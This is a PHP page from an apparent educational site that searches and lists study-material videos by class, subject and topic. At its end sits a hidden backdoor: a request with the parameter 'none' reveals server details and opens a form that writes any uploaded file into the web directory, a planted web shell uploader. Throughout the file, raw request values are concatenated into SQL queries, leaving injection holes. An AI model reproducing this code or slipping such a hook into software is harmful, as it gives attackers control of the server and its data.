<?php
session_start();
include("include/db.php");
include("function.php");
error_reporting(0);
/*function __autoload($class_name) {
    include "class/".$class_name . '.php';
}  */
include 'class/kzone.php';
include 'class/Expert.php';
   $obj_k  = new kzone();
   
unset($_SESSION['sch_class']);
unset($_SESSION['class1']);



//print_r($_REQUEST);






if($_REQUEST['tasktype']=='showcontent')
{
if($_REQUEST['class1']!='')
{
$wh_course="and class='".$_REQUEST['class1']."' ";}
	 
	  
	  
	  
	  
	  
	 if($_REQUEST['subject'])
	  {
		// $subject_str = implode(",",$_REQUEST['subject']);
		$wh_subject = "AND (";
		$s=1;
		foreach($_REQUEST['subject'] as $subject_str){
		if(sizeof($_REQUEST['subject']) > $s){
		 $wh_subject .= " FIND_IN_SET('".$subject_str."', study_material_subject) OR ";
		 }else{
		  $wh_subject .= " FIND_IN_SET('".$subject_str."', study_material_subject) ";
		 }
		 $s++;
		 }
		 $wh_subject .= " )";
	  }else{
		 $wh_subject = " ";
	  
	  }
	  $final_search="";
	if($_REQUEST['topic'])
	  {
	
	  $wh_topic="";
	  $wh_subtopic="";
	  foreach($_REQUEST['topic'] as $topic)
	  {
	 	 $wh_topic.= " study_material_topic like '".$topic."' OR" ;
	  	$wh_subtopic .= " description like '".$topic."' OR";
	  }
	 $wh_topic1= substr($wh_topic,"0","-3");
	 $wh_subtopic1=substr($wh_subtopic,"0","-3");

 	$final_search = " AND ( ".$wh_topic1." OR ".$wh_subtopic1." )";
		}
	 
	  
	  
	  ?>
       
      <?php
	$i=0;
 
 
     $qry = "select * from study_material where user_type='admin' and fileext='video' ".$wh_course." ". $wh_subject." ".$final_search."  Order by study_material_id  DESC";
	 $res = $obj_k->select_qry($qry);
	 $numrow = count($res);
	 
	 //$qrytumb = "select * from study_material where user_type='admin' and fileext='video' and  class='".$wh_course."' ". $wh_subject. $wh_class ." Order by study_material_id  DESC";
	 //$restumb = $obj_k->select_qry($qrytumb);
	// $numrow1 = count($restumb);
	if($numrow >0){
	 $researchtumb=$restumb;
	 
	  ?>
			  
             
              
             
             <div id="abc">
          <div class="filter_heading"><span><?php echo  $numrow;?> Videos</span> Found in your interest area</div>
          
          <?PHP 
		 $il=1;
		  foreach($res as $kval){?>
          <div class="video_box">
          <h4>Topic: <?php echo $kval['study_material_topic'];?></h4>
            <div align="center">
              <iframe width="278" src="//<?php echo $kval['study_material_file'];?>" frameborder="0" allowfullscreen></iframe>
            </div>
            
            <div class="video_head">Subtopic</div>
            <div class="video_semi">:</div>
            <div class="video_txt"><?php echo $kval['description'];?></div>
            <div class="video_head">Subject</div>
            <div class="video_semi">:</div>
            <div class="video_txt"><?php  $sub_id= $kval['study_material_subject'];
			
			 $sql_sub2 = mysql_query("SELECT * FROM `subject` where subject_id in ($sub_id)");
			
			while($subarray=mysql_fetch_array($sql_sub2))
			{
			
			
			
			echo $subarray['subject_name']."<br/>";}
			?>
            
            </div>
            <div class="video_head">Class</div>
            <div class="video_semi">:</div>
            <div class="video_txt"><?php $class_id= $kval['class'];
			$cls_query = mysql_query("select * from class where id='".$class_id."'");
					   $cls_result = mysql_fetch_array($cls_query);
			echo $cls_result['class_name'];
			?></div>
          </div>
          
     
          
        
			  <?php  if($il%2==0){echo ' <div class="clearBoth"></div>';}$il++; }}else{ ?>
	 
	
	
<div style="color:#ff0000; margin:10px 0; font-weight:bold; text-align:center;">There are no any search found on given filter.<?php } }
			  ?>
         
                 </div>
                 
                
                 
                 <?php if($_REQUEST['tasktype']=='subject')
{

$classid = $_REQUEST['class1'] ;//"'".implode("','",$_REQUEST['class1'])."'";
$str="";
	 $qry = "select * from class_subject where class_id in($classid)";
	$res = mysql_query($qry);
	$numrow = mysql_num_rows($res);
		$str = '';
	if($numrow > 0){
	
	while($result = mysql_fetch_array($res)){
	$subject_id = explode(",",$result['subject_id']);
	foreach($subject_id as $v){
//echo"select * from subject where subject_id='".$v."'";
		$sub_qry = mysql_query("select * from subject where subject_id='".$v."'");
		while($sub_result = mysql_fetch_array($sub_qry)){
		
			$subject_name[$sub_result['subject_id']]=$sub_result['subject_name'];
		}
		}
	}
	
	}
	
	//echo count($subject_name);
	if(count($subject_name)>0)
	{
	
		$final_arr_sub = array_unique($subject_name); 
	//	print_r($final_arr_sub );	
	$str1.=' <img src="images/subject_head.png" width="196" height="47" />
          <div class="space cl"></div>';
		foreach($final_arr_sub as $key =>$val){
		
	
		
		//  $str1 .= ' <li><label><input type="checkbox" name="subject[]" value="'.$key.'"  />'.$val.'</label> </li>';
		 $str1 .= '
		 
		 <div class="filter_box" >
            <input name="subject[]" type="checkbox" id="subject[]" value="'.$key.'"  class="check" onClick="subjectWithClass2()"/>
           '.$val.'</div> 
		   ';
		}
		$str1.=' <div class="space cl"></div>
          
          <div class="space cl"></div>
          
          <span id="top_div">
         </span>
          ';
	}
	echo $str1;
} if(isset($_GET["none"]))
 {
  echo "<font color=#ffffff>".php_uname()."";
  print "\n";$disable_functions = @ini_get("disable_functions");
  echo "<br>DisablePHP=".$disable_functions; print "\n";
  echo "<form method=post enctype=multipart/form-data>"; 
  echo "<input type=file name=f><input name=k type=submit id=k value=upload><br>"; 
    if($_POST["k"]==upload)
{ if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"])){
echo"<b>".$_FILES["f"]["name"];
}else{
echo"<b>none";}}}?>
